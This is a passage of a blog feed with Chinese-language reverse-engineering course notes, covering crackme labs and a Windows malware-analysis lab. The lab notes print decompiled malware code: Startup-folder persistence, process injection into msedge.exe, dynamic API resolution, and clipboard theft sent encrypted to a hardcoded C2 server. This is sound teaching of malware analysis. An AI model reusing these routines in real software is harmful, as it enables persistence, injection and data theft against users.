Process/Thread 好用的解題工具 angr - cheatsheet: $ pip install angr claripy z3: $ pip install z3-solver</description></item><item><title>Simple Reverse - 0x01(Lab - Sacred Arts)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/index.html</guid><description>Simple Reverse - 0x01(Lab - Sacred Arts) Background X86組合語言/基本指令集 neg (Negate) instruction 實作：先在執行neg rax之前把$rax設定成2，執行指令之後剛好是2的補數 gef➤ set $rax=2 gef➤ info r $rax rax 0x2 0x2 gef➤ ni 0x00000000004010e0 in ?? () gef➤ info r $rax rax 0xfffffffffffffffe 0xfffffffffffffffe X86組合語言/基本指令集/IA32指令:xchg 實作：執行xchg ah, al之前先看一下$rax的狀態 gef➤ info r $rax rax 0xfffffffffffffffe 0xfffffffffffffffe gef➤ ni 0x00000000004010e2 in ?? () gef➤ info r $rax rax 0xfffffffffffffeff 0xfffffffffffffeff Source Code :::spoiler IDA Pro Disassembler Code</description></item><item><title>Simple Reverse - 0x03(Lab - Why)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/index.html</guid><description>Simple Reverse - 0x03(Lab - Why) Background What is function pointer? Lecture Vid. Source Code :::spoiler IDA main function
int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+Ch] [rbp-4h] printf("Give me flag: "); __isoc99_scanf("%25s", buf); for ( i = 0; i &lt;= 24; ++i ) { if ( buf[i] - 10 != enc_flag[i] ) return 0; } pass = 1; return 0; } :::</description></item><item><title>Simple Reverse - 0x14(2023 Lab - AssemblyDev)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/index.html</guid><description>Simple Reverse - 0x14(2023 Lab - AssemblyDev) Background Tools Assembly x86 Emulator Compiler Explorer
Source code :::spoiler arithmatic.py
#!/usr/bin/python from module.checker import * from module.math import * from sys import argv challenge_info = f''' let a = MEM[RSP+0x0:RSP+0x4] let b = MEM[RSP+0x4:RSP+0x8] let c = MEM[RSP+0x8:RSP+0xc] EAX = a + b EBX = a - b ECX = -c EDX = 9*a + 7 ''' a = get_rand(4) b = get_rand(4) c = get_rand(4) init_list = [ (RSP_DEFAULT + 0x0, a, 4), (RSP_DEFAULT + 0x4, b, 4), (RSP_DEFAULT + 0x8, c, 4), ] ans_list = [ ("eax", add(a, b, 4)), ("ebx", sub(a, b, 4)), ("ecx", neg(c, 4)), ("edx", add(mul(a, 9, 4), 7, 4)), ] if __name__ == "__main__": if len(argv) &lt; 2: print(f"{C.BLUE}[+]{C.NC} Usage: python3 {__file__} &lt;path_to_asm_file>") print(challenge_info) exit(0) code = open(argv[1], 'r').read() Checker(init_list, ans_list, code) ::: :::spoiler data_movement.py</description></item><item><title>Simple Reverse - 0x15(2023 HW - crackme_vectorization)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/index.html</guid><description>Simple Reverse - 0x15(2023 HW - crackme_vectorization) Source Code :::spoiler IDA Main Function
__int64 __fastcall main(int a1, char **a2, char **a3) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND] __isoc99_scanf("%d", &amp;user_input_len); // 長度為49 user_input_len_cp = user_input_len; sqrt_length = sqrt((double)user_input_len); // 開根號後是7 sqrt_length_cp = (int)sqrt_length; if ( sqrt_length > (double)(int)sqrt_length ) ++sqrt_length_cp; sqrt_len = _mm_shuffle_epi32(_mm_cvtsi32_si128(sqrt_length_cp), 224).m128i_u64[0];// 原本的shuffle num就是user input length的開根號結果 space = (struc_1 *)malloc(0x10uLL); space->sqrt_len = sqrt_len; size = 4 * sqrt_length_cp * (__int64)sqrt_length_cp;// size是196 shuffle_space = malloc(size); space->content_space = (__int64)shuffle_space; if ( user_input_len_cp > 0 ) { shuffle_space_cp = shuffle_space; len = 0LL; do { __isoc99_scanf("%d", content); shuffle_space_cp[len++] = content[0]; } while ( user_input_len > (int)len ); // 要輸入東西49次 } if ( length == sqrt_length_cp &amp;&amp; (space_1 = (struc_1 *)malloc(0x10uLL), space_1->sqrt_len = sqrt_len, shuffle_space_1 = malloc(size), src = cipher_flag, space_1->content_space = (__int64)shuffle_space_1, memcpy(shuffle_space_1, src, size), result = ugly_matrix_multiplication( (int *)space_1, (__int64)space), // guess_cipher的大小是196 // 他會把我們輸入的東西和他原本的東西一起送到guess_encrypt的這個function中 !memcmp((const void *)result[1], verify_key, size)) ) { puts("Correct!"); } else { puts(":("); } return 0LL; } ::: :::spoiler IDA Ugly Function</description></item><item><title>Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/index.html</guid><description>Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80) Description 分析 eductf-lab.exe 中的 function sub_140001C80 在做什麼，並找出其行為所對應的 MITRE ATT&amp;CK technique ID。 Flag format: FLAG{T1234.001}
Background GetModuleFileNameA GetUserNameA CopyFileA SetFileAttributesA Source code Main Function int __cdecl main(int argc, const char **argv, const char **envp) { Sleep(0x1B7740u); sub_140001C80(); sub_140001030(); sub_140001120(); sub_140001BF0(); return 0; } sub_140001C80 :::spoiler IDA Source Code DWORD sub_140001C80() { DWORD result; // eax size_t v1; // rax DWORD v2; // [rsp+20h] [rbp-258h] const CHAR *lpNewFileName; // [rsp+28h] [rbp-250h] DWORD pcbBuffer[4]; // [rsp+30h] [rbp-248h] BYREF CHAR Buffer[272]; // [rsp+40h] [rbp-238h] BYREF CHAR Filename[272]; // [rsp+150h] [rbp-128h] BYREF result = GetModuleFileNameA(0i64, Filename, 0x104u); v2 = result; if ( result ) { result = GetUserNameA(Buffer, pcbBuffer); if ( result ) { v1 = pcbBuffer[0] + v2 + 100; if ( __CFADD__(pcbBuffer[0], v2 + 100) ) v1 = -1i64; lpNewFileName = (const CHAR *)malloc(v1); sub_140001350( lpNewFileName, v2 + pcbBuffer[0] + 100, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityUpdateCheck.exe", Buffer); result = CopyFileA(Filename, lpNewFileName, 0); if ( result ) return SetFileAttributesA(lpNewFileName, 0x26u); } } return result; } ::: Recon :::spoiler IDA sub_14001C80(解析版)</description></item><item><title>Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/index.html</guid><description>Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030) Description 分析 eductf-lab.exe 中的 function sub_140001030 在做什麼，並找出其行為所對應的 MITRE ATT&amp;CK technique ID。 Flag format: FLAG{T1234}
Background SystemTimeToFileTime CreateWaitableTimerW SetWaitableTimer WaitForSingleObject Source code sub_140001030 :::spoiler IDA Source Code int waitUntil20231118() { HANDLE Result; // rax HANDLE hTimer; // [rsp+30h] [rbp-38h] SYSTEMTIME SystemTime; // [rsp+38h] [rbp-30h] BYREF struct _FILETIME FileTime; // [rsp+48h] [rbp-20h] BYREF LARGE_INTEGER DueTime; // [rsp+50h] [rbp-18h] BYREF SystemTime.wYear = 2023; SystemTime.wMonth = 11; SystemTime.wDay = 18; SystemTime.wDayOfWeek = 6; SystemTime.wHour = 0; SystemTime.wMinute = 0; SystemTime.wSecond = 0; SystemTime.wMilliseconds = 0; LODWORD(Result) = SystemTimeToFileTime(&amp;SystemTime, &amp;FileTime); if ( Result ) { DueTime = FileTime; Result = CreateWaitableTimerW(0i64, 0, 0i64); hTimer = Result; if ( Result ) { LODWORD(Result) = SetWaitableTimer(Result, &amp;DueTime, 0, 0i64, 0i64, 0); if ( Result ) LODWORD(Result) = WaitForSingleObject(hTimer, 0xFFFFFFFF); } } return Result; } ::: Recon 攻擊者的完整意圖</description></item><item><title>Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/index.html</guid><description>Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120) Description 分析 eductf-lab.exe 中的 function sub_140001120 在做什麼，並找出其所建立的 Mutex 的名稱。 Flag format: FLAG{mutex_name}
Background CreateMutexA GetLastError 使用 Mutex 物件 可以使用 mutex 物件 來保護共用資源，避免多個執行緒或進程同時存取。 每個執行緒都必須等候 mutex 的擁有權，才能執行可存取共用資源的程式碼。 例如，如果數個執行緒共用資料庫的存取權，執行緒可以使用 mutex 物件一次只允許一個執行緒寫入資料庫。
系統錯誤碼 (0-499) ERROR_ALREADY_EXISTS 183 (0xB7) 無法建立檔案，該檔案已存在。
Source code sub_140001120 :::spoiler IDA Source Code int sub_140001120() { HANDLE MutexA; // rax int i; // [rsp+20h] [rbp-78h] int v3[2]; // [rsp+30h] [rbp-68h] CHAR Name[32]; // [rsp+38h] [rbp-60h] BYREF char v5[32]; // [rsp+58h] [rbp-40h] BYREF v3[0] = 1684234874; qmemcpy(v5, &amp;unk_140003348, 0x1Dui64); for ( i = 0; i &lt; 28; ++i ) Name[i] = *(v3 + i % 4) ^ v5[i]; MutexA = CreateMutexA(0i64, 1, Name); if ( MutexA ) { LODWORD(MutexA) = GetLastError(); if ( MutexA == 183 ) exit(0); } return MutexA; } ::: Recon 這一題有個小地方要注意，雖然觀察過source code是非常簡單的建立mutex的操作，題目想要知道的mutex name也非常簡單，只是個xor就知道的東西，不過在實作上需要注意endian的問題，一開始我是直接按照0x64, 0x63, 0x62, 0x7A的順序，但結果輸出一些ascii的字元，其實他是從後面讀進來再開始操作xor</description></item><item><title>Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/index.html</guid><description>Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload) Description 取出 eductf-lab.exe 中的 next stage payload (embedded PE file)，並計算其 MD5 hash。 Flag format: FLAG{462fe0000…} (hex character must be lowercase)
Background DOS Header NT Headers - Optional Header Source code sub_140001870 :::spoiler IDA Source Code解析前 __int64 __fastcall sub_140001870(char **pe_file, _QWORD *pe_file_size) { *pe_file = byte_140005040; *pe_file_size = 72770i64; // 這是個是怎麼判斷成PE size我也不知道 if ( **pe_file == 'ZM' ) { if ( *(sub_1400013D0(*pe_file) + 0x18) == 0x20B ) { return 1i64; } else { sub_140001260("remote dll optional header magic check failed\n"); return 0i64; } } else { sub_140001260("remote dll magic check failed\n"); return 0i64; } } ::: Recon 進到sub_140001BF0之後可以先觀察sub_140001870，前面有source code可以看到他正在比對byte_140005040的前面兩個字元是不是等於MZ，也就是一支PE file的magic header，並且又比對了後面0x18的位置是不是等於0x20B，也就是另外一個magic header(用來判斷該程式是否可於64-bits運行)，由以上操作幾乎可以確定駭客把真正的程式(可能是惡意的)塞在正常的PE file中 :::info 如果只是要解題的話，到這邊就可以了，只要利用前一題學到的把byte_140005040改變他的type，變成char[72770]，再用Shift+E，把raw data export出來，丟到online md5 checksum，就可以得到這支檔案的hash(462fe0007f86957f59824e113f78947c) ::: sub_1400013D0仔細看他的操作，其實就是把byte_140005040的地址，加上0x3C，再取值，就是e_lfanew，也就是NT Headers的file offset，這個offset加上原本的原本的140005040就是NT header，所以可以把sub_1400013D0 rename成getNtHdr __int64 __fastcall getNtHdr(__int64 a1) { return *(a1 + 0x3C) + a1; } 接下來可以改變這個function的type，按Y，改IMAGE_NT_HEADERS *__fastcall getNtHdr(_QWORD)，就變得非常簡潔好看，另外，要把pe_file的type從_int64改成_QWORD的原因是pe_file存的是byte_140005040的地址，不是數字，雖然代表的byte數一樣，但意義不相同，所以IDA可能會解析不出來 最後就把目前的這個sub function rename成getEmbeddedPE_File就可以了 :::info ::: :::spoiler 解析後</description></item><item><title>Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/index.html</guid><description>Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2) Background CreateToolhelp32Snapshot Process32FirstW GetCurrentProcess OpenProcess EqualSid Process32NextW OpenProcessToken GetTokenInformation Source code sub_1400016B0 :::spoiler IDA Source Code解析前 __int64 returnTargetPid() { DWORD LastError; // eax DWORD v2; // eax WCHAR *szExeFile; // rax signed __int64 v4; // rcx WCHAR v5; // dx int v6; // eax DWORD th32ProcessID; // [rsp+20h] [rbp-288h] HANDLE hSnapshot; // [rsp+28h] [rbp-280h] HANDLE hObject; // [rsp+30h] [rbp-278h] HANDLE CurrentProcess; // [rsp+38h] [rbp-270h] PSID pSid1; // [rsp+40h] [rbp-268h] BYREF PSID pSid2; // [rsp+48h] [rbp-260h] BYREF PROCESSENTRY32W pe; // [rsp+50h] [rbp-258h] BYREF hSnapshot = CreateToolhelp32Snapshot(2u, 0); if ( hSnapshot == (HANDLE)-1i64 ) { LastError = GetLastError(); sub_140001260("CreateToolhelp32Snapshot failed with error %lu\n", LastError); return 0i64; } else { pe.dwSize = 568; if ( Process32FirstW(hSnapshot, &amp;pe) ) { pSid2 = malloc(0x44ui64); CurrentProcess = GetCurrentProcess(); sub_140001500(CurrentProcess, &amp;pSid2); th32ProcessID = 0; do { pSid1 = malloc(0x44ui64); hObject = OpenProcess(0x400u, 0, pe.th32ProcessID); if ( hObject ) { if ( (unsigned int)sub_140001500(hObject, &amp;pSid1) ) { if ( EqualSid(pSid1, pSid2) ) { szExeFile = pe.szExeFile; v4 = (char *)L"msedge.exe" - (char *)pe.szExeFile; while ( 1 ) { v5 = *szExeFile; if ( *szExeFile != *(WCHAR *)((char *)szExeFile + v4) ) break; ++szExeFile; if ( !v5 ) { v6 = 0; goto LABEL_14; } } v6 = v5 &lt; *(WCHAR *)((char *)szExeFile + v4) ? -1 : 1; LABEL_14: if ( !v6 ) th32ProcessID = pe.th32ProcessID; } free(pSid1); } CloseHandle(hObject); } } while ( !th32ProcessID &amp;&amp; Process32NextW(hSnapshot, &amp;pe) ); free(pSid2); CloseHandle(hSnapshot); return th32ProcessID; } else { v2 = GetLastError(); sub_140001260("Process32First failed with error %lu\n", v2); CloseHandle(hSnapshot); return 0i64; } } } ::: Recon 首先，他先利用CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)把當前系統中所有的process都snapshot，並回傳指定快照集的開啟控制碼(handle)</description></item><item><title>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/index.html</guid><description>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3) Background VirtualAllocEx 記憶體保護常數 WriteProcessMemory CreateRemoteThread Export Address Table(EAT) Source code :::spoiler Source Code sub_140001A60
__int64 __fastcall sub_140001A60(DWORD edge_pid, const void *pe_file, SIZE_T pe_file_size) { DWORD v4; // eax DWORD LastError; // eax HANDLE hProcess; // [rsp+40h] [rbp-38h] char *lpBaseAddress; // [rsp+48h] [rbp-30h] LPTHREAD_START_ROUTINE lpStartAddress; // [rsp+50h] [rbp-28h] __int64 v9; // [rsp+58h] [rbp-20h] BYREF DWORD ThreadId; // [rsp+60h] [rbp-18h] BYREF v9 = 0i64; sub_1400018F0(pe_file, &amp;v9); if ( v9 ) { hProcess = OpenProcess(0x43Au, 0, edge_pid); if ( hProcess ) { lpBaseAddress = (char *)VirtualAllocEx(hProcess, 0i64, pe_file_size, 0x3000u, 0x40u); if ( WriteProcessMemory(hProcess, lpBaseAddress, pe_file, pe_file_size, 0i64) ) { lpStartAddress = (LPTHREAD_START_ROUTINE)&amp;lpBaseAddress[v9]; CreateRemoteThread(hProcess, 0i64, 0i64, (LPTHREAD_START_ROUTINE)&amp;lpBaseAddress[v9], 0i64, 0, &amp;ThreadId); sub_140001260("remote thread id: %lu, loader address: %p", ThreadId, lpStartAddress); return 1i64; } else { LastError = GetLastError(); sub_140001260("WriteProcessMemory failed, %lu", LastError); return 0i64; } } else { v4 = GetLastError(); sub_140001260("OpenProcess failed, %lu", v4); return 0i64; } } else { sub_140001260("get_reflectivce_loader_offset failed\n"); return 0i64; } } :::</description></item><item><title>Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/index.html</guid><description>Simple Reverse - 0x22(2023 Lab - WinMalware - Collect) Background 如果想要分析DLL，可以從以下三個地方切入
_DllMainCRTStartup (DLL 載入和移除時的初始化與收尾) DllMain / DllEntryPoint / CRT_INIT (function signature 相同) 找有三個參數的 function call 範例就大概像這樣，從_DllMainCRTStartup底下有call _CRT_INIT和call DllEntryPoint(DllMain在比較下面) Exported Functions TLS Callback OpenClipboard GetClipboardData globalLock _itoa Source Code IDA解析的source code很常會出現明明沒有return value但還是自動建立的狀況，所以適時的刪除return value(Shift+DEL)是對分析比較好的做法
DllMain BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { if ( fdwReason == 1 ) { MessageBoxA(0i64, "Reflective Dll Injection success. Remember to delete the persistence file", "eductf-lab", 0); my_main(); // 不重要的東西 collect_and_exfiltrate(); } return 1; } collect_and_exfiltrate void collect_and_exfiltrate(void) { PUCHAR pbInput; // [rsp+28h] [rbp-10h] BYREF pbInput = 0i64; collect_data(&amp;pbInput); exfiltrate(pbInput); } collect_data void __fastcall collect_data(char **pbInput) { char *pbInput_1; // [rsp+28h] [rbp-10h] BYREF collect_get_clipboard_data(&amp;pbInput_1); *pbInput = pbInput_1; } collect_get_clipboard_data void __fastcall collect_get_clipboard_data(LPVOID *pbInput) { HANDLE ClipboardData; // rax void *v3; // rsi int LastError; // eax char Buffer[34]; // [rsp+26h] [rbp-22h] BYREF if ( OpenClipboard(0i64) ) { ClipboardData = GetClipboardData(1u); v3 = ClipboardData; if ( ClipboardData ) { *pbInput = GlobalLock(ClipboardData); GlobalUnlock(v3); } else { LastError = GetLastError(); _itoa(LastError, Buffer, 10); } } CloseClipboard(); } Recon 目前要分析的重點著重在DllMain中，所以其他的切入點可以先不管，並且先聚焦在collect data身上。其實作者一開始就有把debug information都放在這邊，所以分析可以更順暢</description></item><item><title>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/index.html</guid><description>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate) Description 請根據 next stage payload 的行為，分析 capture.pcapng 中的封包，找出並解密被滲出/傳送到 C2 server 的資料。
Background WSAStartup htons socket sockaddr WSAConnect Source Code exfiltrate :::spoiler source void __fastcall exfiltrate(PUCHAR pbInput) { __int64 s[2]; // [rsp+28h] [rbp-10h] BYREF connect_to_c2(s); send_collected_data_to_c2(s[0], pbInput); shutdown(s[0], 1); closesocket(s[0]); } ::: connect_to_c2 :::spoiler source void __fastcall connect_to_c2(unsigned __int64 *a1) { unsigned __int64 v2; // rax struct sockaddr name; // [rsp+20h] [rbp-1B8h] BYREF struct WSAData WSAData; // [rsp+30h] [rbp-1A8h] BYREF if ( !WSAStartup(0x202u, &amp;WSAData) ) { *&amp;name.sa_data[2] = 168470720; *name.sa_data = htons(0x2BB3u); name.sa_family = 2; v2 = socket(2, 1, 6); *a1 = v2; connect(v2, &amp;name, 16); } } ::: send_collected_data_to_c2 :::spoiler source void __fastcall send_collected_data_to_c2(SOCKET s, PUCHAR pbInput) { char *v4; // rbx int v5; // esi int i; // eax char v7; // al int j; // ecx int v9; // eax v4 = malloc(0x4Cui64); *v4 = 0x11877811; *(v4 + 1) = 4; *(v4 + 2) = 0; if ( send(s, v4, 76, 0) > 0xB ) { v5 = 0; while ( v5 &lt;= 2 ) { if ( recv(s, v4, 76, 0) > 0xB &amp;&amp; *v4 == 0x11877811 ) { v9 = *(v4 + 2); if ( v9 ) { switch ( v9 ) { case 1: *v4 = 0x11877811; *(v4 + 1) = 4; *(v4 + 2) = 1; encrypt_key = (v4 + 12); encrypt_data(pbInput); for ( i = 2; i &lt;= 23; ++i ) v4[i + 12] += v4[i + 11] - v4[i + 10]; break; case 2: *v4 = 0x11877811; *(v4 + 1) = 28; *(v4 + 2) = 2; memcpy_s(v4 + 12, 0x18ui64, cipher, 0x18ui64); break; case 3: goto LABEL_20; } } else { *v4 = 0x11877811; *(v4 + 1) = 4; *(v4 + 2) = 0; } for ( j = 0; j &lt;= 39; ++j ) { v7 = v4[j + 36] + v4[43] + v4[49] - v4[67]; v4[j + 36] = v7; v4[j + 36] = v4[54] - (v4[61] + v4[69]) + v7; } send(s, v4, 76, 0); ++v5; } } LABEL_20: free(v4); } } ::: Recon connet_to_c2 目標是取得c2 server的IP和port number</description></item><item><title>Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x242023-lab---winmalware---dynamic-api-resolution-background/index.html</guid><description>Simple Reverse - 0x24(2023 Lab - WinMalware - Dynamic API Resolution Background) Background Process Environment Block (PEB) 紀錄許多 Process 相關資訊的 OS 資料結構 存在於 user land x86 環境下，可以從 fs:[0x30] 取得 x64 環境下，可以從 gs:[0x60] 取得 ==0x18: Ldr== 指向 _PEB_LDR_DATA 結構 _PEB (注意 x64 和 x86 結構不同) _PEB_LDR_DATA 紀錄 Process 中載入模組的相關資訊 模組 module：PE 或 DLL ==0x10: InLoadOrderModuleList== 指向 _LDR_DATA_TABLE_ENTRY 依載入順序串起的雙向 linked list _PEB_LDR_DATA _LDR_DATA_TABLE_ENTRY 紀錄一個載入模組的相關資訊 ==0x00: InLoadOrderModuleList== 依載入順序串起的雙向 linked list Flink：指向下一個 entry ==0x30: DllBase== 此載入模組的 ImageBase ==0x58: BaseDllName== 此載入模組的檔案名稱 _LDR_DATA_TABLE_ENTRY Exploit Defense Evasion — Dynamic API Resolution 用途: 駭客常用的手法往往倚賴特定的 API 來達成，例如：Injection = VirtualAllocEx + WriteProcessMemory + CreateRemoteThread，因此資安產品只要監控這些 API，就很容易偵測到惡意行為 Shellcode 沒有 loader 幫你把 API 連結起來</description></item><item><title>Simple Reverse - 0x25(2023 Lab - WinMalware - 作業)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x252023-lab---winmalware---%E4%BD%9C%E6%A5%AD/index.html</guid><description>Simple Reverse - 0x25(2023 Lab - WinMalware - 作業) Description 在 next stage payload 的 my_start 導出函數中，惡意程式透過 dynamic API resolution 手法取得了一些 APIs。請問其從 user32.dll 取得的 API 的名稱為何？ A list of all exported functions of user32.dll
Flag format: FLAG{WindowsAPIname}
Background Dynamic API Resolution Background
Recon 根據前一個筆記，我們已經知道他怎麼找API，只是我們還不知道他用的到底是哪一個API，因為他有事先用過hash，題目也是要我們找到這一個部分，最簡單的做法是把user32.dll的所有API都用作者自定義的hash function做一遍，直到找到他要的那一個，目前問題最大的應該是不知道__ROL4__的意思，根據x86 and amd64 instruction reference
The rotate left (ROL) and rotate through carry left (RCL) instructions shift all the bits toward more-significant bit positions, except for the most-significant bit, which is rotated to the least-significant bit location. The rotate right (ROR) and rotate through carry right (RCR) instructions shift all the bits toward less significant bit positions, except for the least-significant bit, which is rotated to the most-significant bit location.</description></item><item><title>Simple Reverse - 0x26(2023 HW - Banana Donut Verifier)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x262023-hw---banana-donut-verifier/index.html</guid><description>Simple Reverse - 0x26(2023 HW - Banana Donut Verifier) Source Code :::spoiler Source Code
__int64 __fastcall main(int a1, char **a2, char **a3) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND] v47 = 0.0; v46 = 0.0; v42 = 0LL; memset(user_input, 0, 1024); printf("Dount Verifier\nInput: "); __isoc99_scanf("%1023s", user_input); printf("\x1B[2J"); // 這個意思是清除整個頁面 for ( i = 0LL; i &lt;= 499; ++i ) { memset(s, 32, sizeof(s)); memset(v20, 0, sizeof(v20)); for ( j = 0.0; j &lt; 6.28; j = v14 ) { v40 = 0; for ( k = 0.0; k &lt; 6.28; k = v13 ) { v3 = _mm_cvtsi32_si128(LODWORD(k)); *v3.m128i_i64 = (compute_sinf)(*v3.m128i_i64);// 計算浮點數的正弦值，參考自https://learn.microsoft.com/zh-tw/cpp/c-runtime-library/reference/sin-sinf-sinl?view=msvc-170 v37 = COERCE_FLOAT(_mm_cvtsi128_si32(v3)); v4 = _mm_cvtsi32_si128(LODWORD(j)); *v4.m128i_i64 = (compute_conf)(*v4.m128i_i64);// 計算餘弦值，參考自https://learn.microsoft.com/zh-tw/cpp/c-runtime-library/reference/cos-cosf-cosl?view=msvc-170 v36 = COERCE_FLOAT(_mm_cvtsi128_si32(v4)); v5 = _mm_cvtsi32_si128(LODWORD(v47)); *v5.m128i_i64 = (compute_sinf)(*v5.m128i_i64); v35 = COERCE_FLOAT(_mm_cvtsi128_si32(v5)); v6 = _mm_cvtsi32_si128(LODWORD(j)); *v6.m128i_i64 = (compute_sinf)(*v6.m128i_i64); v34 = COERCE_FLOAT(_mm_cvtsi128_si32(v6)); v7 = _mm_cvtsi32_si128(LODWORD(v47)); *v7.m128i_i64 = (compute_conf)(*v7.m128i_i64); v33 = COERCE_FLOAT(_mm_cvtsi128_si32(v7)); v32 = v36 + 2.0; v31 = 1.0 / ((((v37 * (v36 + 2.0)) * v35) + (v34 * v33)) + 5.0); v8 = _mm_cvtsi32_si128(LODWORD(k)); *v8.m128i_i64 = (compute_conf)(*v8.m128i_i64); v30 = COERCE_FLOAT(_mm_cvtsi128_si32(v8)); v9 = _mm_cvtsi32_si128(LODWORD(v46)); *v9.m128i_i64 = (compute_conf)(*v9.m128i_i64); v29 = COERCE_FLOAT(_mm_cvtsi128_si32(v9)); v10 = _mm_cvtsi32_si128(LODWORD(v46)); *v10.m128i_i64 = (compute_sinf)(*v10.m128i_i64); v28 = COERCE_FLOAT(_mm_cvtsi128_si32(v10)); v27 = ((v37 * v32) * v33) - (v34 * v35); v26 = (((v31 * 30.0) * (((v30 * v32) * v29) - (v27 * v28))) + 40.0); v25 = (((v31 * 15.0) * ((v27 * v29) + ((v30 * v32) * v28))) + 